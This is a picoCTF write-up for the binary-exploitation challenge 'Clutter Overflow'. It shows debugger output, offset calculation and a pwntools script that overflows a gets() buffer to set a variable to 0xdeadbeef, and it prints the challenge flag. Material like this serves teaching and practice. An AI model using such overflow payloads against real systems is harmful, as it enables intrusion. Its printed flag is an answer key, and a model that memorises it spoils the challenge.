---
title: Clutter Overflow 
date: 2025-12-07 12:00:00
categories: [CTF, binary exploitation]
tags: [writeup, picoctf]
---

## Сhallenge Info
* Platform: picoCTF
* Category: binary exploitation
* Diffuculty: medium

## Challenge Description
Clutter, clutter everywhere and not a byte to use. 
```bash
nc mars.picoctf.net 31890
```

## Solution
I didn't look at the source code for this challenge because it's too easy to solve without and we won't always have the source code. 

Alright, we given two files: chall - binary itself, and chall.c - source code of the binary.

After using file and checksec to check binary's architecture and protection we have:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/clutter_overflow]
└─$ file chall && checksec --file=chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=181b4752cc92cfa231c45fe56676612e0ded947a, not stripped
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       FortifiableFILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               2          chall
```
Binary has 64 bit architecture, no canary and no PIE (Position Independent Executable), which means that all function and variable addresses are static and do not change with each execution. 

Let's run the program:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/clutter_overflow]
└─$ ./chall
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?

```
Program greets us with ASCII art of a room, and text "My room is so cluttered...\nWhat do you see?" and waits for our input.

Let's check for buffer overflow vulnerability, entering a lot of junk to the input:
```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/clutter_overflow]
└─$ python3 -c "print('A' * 300)" | ./chall
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0x4141414141414141
code != 0xdeadbeef :(
zsh: done                python3 -c "print('A' * 300)" | 
zsh: segmentation fault  ./chall
```
We use python3 to print 300 characters of 'A' and then pipe it to our binary using '|'.

As a result of piping 300 charachters to our program, we see 2 new lines from the binary and 2 from our shell. Let's analyze it.
```
code == 0x4141414141414141
```
This line shows us that the value in code variable is in hexadecimal. If we decode it, we get "AAAAAAAA", which is our input. In other words, the program has buffer overflow vulnerability, as it overwrote the value of code variable to our input.

```
code != 0xdeadbeef :(
```
Next line checks if code variable is equal to 0xdeadbeef, in our case it's not, so program ends.

```bash
zsh: done                python3 -c "print('A' * 300)" | 
zsh: segmentation fault  ./chall
```
These two lines indicates, that our python3 command was successful and our program crashed with segmentation fault, since we overflow the buffer.

To conclude our goal, what we need to do is to overflow the buffer and overwrite our code variable to 0xdeadbeef to get the flag.

Let's now get to debugging our program. We'll use pwndbg.

```bash
┌──(kali㉿kali)-[~/picoCTF/pwn/clutter_overflow]
└─$ pwndbg chall              
pwndbg: loaded 212 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from chall...
(No debugging symbols found in chall)
pwndbg> 
```
Get info of our functions using info func:
```bash
pwndbg> info func 
All defined functions:

Non-debugging symbols:
0x0000000000400568  _init
0x0000000000400590  puts@plt
0x00000000004005a0  setbuf@plt
0x00000000004005b0  system@plt
0x00000000004005c0  printf@plt
0x00000000004005d0  gets@plt
0x00000000004005e0  _start
0x0000000000400610  _dl_relocate_static_pie
0x0000000000400620  deregister_tm_clones
0x0000000000400650  register_tm_clones
0x0000000000400690  __do_global_dtors_aux
0x00000000004006c0  frame_dummy
0x00000000004006c7  main
0x00000000004007d0  __libc_csu_init
0x0000000000400840  __libc_csu_fini
0x0000000000400844  _fini
```
Let's break at main and generate our input using cyclic in order to find the offset:
```bash
pwndbg> break main
Breakpoint 1 at 0x4006cb
pwndbg> cyclic 300
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
```
Now run run the program and continue until the input. Enter our cyclic pattern to input and check what's going on:
```bash
Continuing.
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa
code == 0x6261616161616169
code != 0xdeadbeef :(

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007c0 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────
*RAX  0
 RBX  0x7fffffffdcb8 —▸ 0x7fffffffe05a ◂— '/home/kali/picoCTF/pwn/clutter_overflow/chall'
*RCX  0
*RDX  0
*RDI  0x7fffffffd8b0 —▸ 0x7fffffffd8e0 ◂— 'code != 0xdeadbeef :(\n6169\n'
*RSI  0x7fffffffd8e0 ◂— 'code != 0xdeadbeef :(\n6169\n'
*R8   0
*R9   0
*R10  0
*R11  0x202
 R12  0
 R13  0x7fffffffdcc8 —▸ 0x7fffffffe088 ◂— 0x5245545f5353454c ('LESS_TER')
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 ◂— 0
 R15  0
*RBP  0x626161616161616a ('jaaaaaab')
*RSP  0x7fffffffdba8 ◂— 'kaaaaaablaaaaaabmaaa'
*RIP  0x4007c0 (main+249) ◂— ret 
```
As we can see, our code variable changed to 0x6261616161616169. Let's take a look at registers:
```bash
*RBP  0x626161616161616a ('jaaaaaab')
```
RBP contains jaaaaaab from our cyclic pattern. To find the offset we use the following command:
```bash
pwndbg> cyclic -l jaaaaaab
Finding cyclic pattern of 8 bytes: b'jaaaaaab' (hex: 0x6a61616161616162)
Found at offset 272
```
Our offset is 272, but since our goal to overwrite code to 0xdeadbeef we subtruct 8 bytes from the offset. Our final offset is 272 - 8 = 264.

Now it's time to code our exploit:

## Exploit 
```python
from pwn import *

target = remote("mars.picoctf.net", 31890) # Connect to the server
offset = 272 - 8 # Offset
junk = b'A' * offset # Our junk 
var = p64(0xdeadbeef) # 0xdeadbeef in bytes

payload = junk + var # payload 

target.recvuntil(b'see?') # wait until the line "see?"
target.sendline(payload) # send our payload
target.interactive() # switch to interactive
```
Let's run it now and get the flag!

```bash
──(kali㉿kali)-[~/picoCTF/pwn/clutter_overflow]
└─$ python3 exploit.py                     

[+] Opening connection to mars.picoctf.net on port 31890: Done
[*] Switching to interactive mode

$ 
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
[*] Got EOF while reading in interactive
$  
```
## Flag
```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```
